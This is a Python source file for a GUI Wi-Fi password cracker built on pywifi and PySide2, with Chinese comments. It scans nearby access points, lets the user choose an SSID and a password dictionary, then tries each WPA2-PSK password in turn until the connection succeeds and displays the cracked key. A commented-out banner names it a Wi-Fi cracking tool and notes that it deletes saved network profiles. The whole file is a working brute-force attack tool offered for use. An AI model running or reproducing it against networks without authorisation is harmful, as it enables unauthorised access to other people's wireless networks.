import os
import sys
import copy
import threading
import pywifi
from pywifi import const
import time
from PySide2.QtWidgets import *
from PySide2.QtUiTools import QUiLoader
from PySide2.QtCore import QFile,QStringListModel


class wifi():
    wifi = pywifi.PyWiFi()  # 获取接口信息
    iface = wifi.interfaces()[0]  # 获取第一个无线网卡接口

    # 获取当前无线网卡信息
    def get_nic(self):
        return self.iface.name()

    # 扫描的wifi列表信息
    def scan_wifi_list(self):
        self.iface.disconnect()  # 断开当前wifi连接
        self.iface.scan()  # 扫描附近AP
        time.sleep(1)  # 等待扫描完成(扫描需要时间)
        results = self.iface.scan_results()  # 获取扫描结果
        ap_set = set()  # 创建一个set集合，用来存放扫描结果，用来对扫描结果进行去重复处理
        for x in results:
            ap_name = x.ssid
            ap_set.add(ap_name)
        global ap_list
        ap_list =list(ap_set)
        # print(ap_list)
        model_list=QStringListModel()
        model_list.setStringList(ap_list)
        return model_list

    # 开始破解
    def Crack(self,status_list):
        # print("被调用")
        # 设置配置文件
        profile = pywifi.Profile()
        global ssid_name
        profile.ssid = ssid_name
        profile.auth = const.AUTH_ALG_OPEN
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        profile.cipher = const.CIPHER_TYPE_CCMP
        # 读取字典
        try:
            global path
            if path[0] != " ":
                print("字典已选择"+path[0])
        except:
            print("未选择字典")
            return
        file = open(path[0], "r")
        N=0         # 循环计数用
        while True:
            password = file.readline()  # 因为\n的存在所以这里if判断直接写了>=9
            if len(password) >= 9:
                profile.key = password
                profile = self.iface.add_network_profile(profile)
                self.iface.connect(profile)
                time.sleep(3)
                if self.iface.status() == const.IFACE_CONNECTED:
                    # print("破解成功，密码:" + password)
                    status_list.addItem("破解成功，密码:" + password.rstrip('\n'))
                    file.close()
                    return
                # print("尝试密码:" + password.rstrip('\n'))
                status_list.addItem("尝试密码:" + password.rstrip('\n'))
                N=N+1
            elif len(password) == 0:
                status_list.addItem("未找到密码")
                return
            else:
                continue

class Stats:
    def __init__(self):
        # 从文件加载UI界面
        qfile_stats = QFile("d:\\temp\\temp\\ui_Main.ui")
        qfile_stats.open(QFile.ReadOnly)
        qfile_stats.close()
        self.ui=QUiLoader().load(qfile_stats)

        # UI界面设置网卡信息
        self.ui.NIC.setText(wifi().get_nic())
        self.ui.auth.setText("const.AUTH_ALG_OPEN")
        self.ui.safe.setText("const.AKM_TYPE_WPA2PSK")
        self.ui.pass_type.setText("const.CIPHER_TYPE_CCMP")

        # 扫描wifi按钮绑定事件
        self.ui.scan_wifi.clicked.connect(self.scan)
        # 选择字典按钮事件
        self.ui.select_dict.clicked.connect(self.path)
        # 破解按钮绑定事件
        self.ui.Start_Crack.clicked.connect(self.Crack)
        # list被选中
        self.ui.wifi_list.clicked.connect(self.select_wifi_list)


    # 点击扫描wifi按钮的绑定事件
    def scan(self):
        # UI界面设置获取的扫描结果
        APs =wifi().scan_wifi_list()
        self.ui.wifi_list.setModel(APs)

    def path(self):
        global path
        path=QFileDialog.getOpenFileName()
        self.ui.textBrowser.setText(path[0])


    def select_wifi_list(self, item):
        global ap_list
        global ssid_name
        ssid_name=ap_list[item.row()]
        self.ui.ssid.setText(ssid_name)

    def Crack(self):
        # 防止界面卡死，开启多线程运行，后台破解
        t1 = threading.Thread(target=wifi().Crack,args=(self.ui.status_list,))
        t1.start()


if __name__ == '__main__':
    app = QApplication([])
    stats1=Stats()
    stats1.ui.show()
    app.exec_()


"""
这段被注释了，暂时不用，
print(''' 
          ------------------------WIFI破解工具------------------------------------------                                                                        
          |   注意事项:                                                     
          |   1.使用时必须将字典和脚本放在同一目录,并将字典重命名为:zd.txt         
          |   2.确认机器带有无线网卡                                          
          |   3.扫描附近wifi时,若10s没有刷新出wifi列表,请按下:回车键                            
          |   4.自动忽略字典中8位数以下的密码   
          |   5.会删除本机以前连接过的wifi配置信息                                     v1.0
          |                                                          作者:PrideAssassin
          ----------------------------------------------------------------------------- 
      ''')
select = input("\n需要删除以前wifi连接信息，确定是否继续：Y/N\n")
if select not in "Yy":
    sys.exit()
"""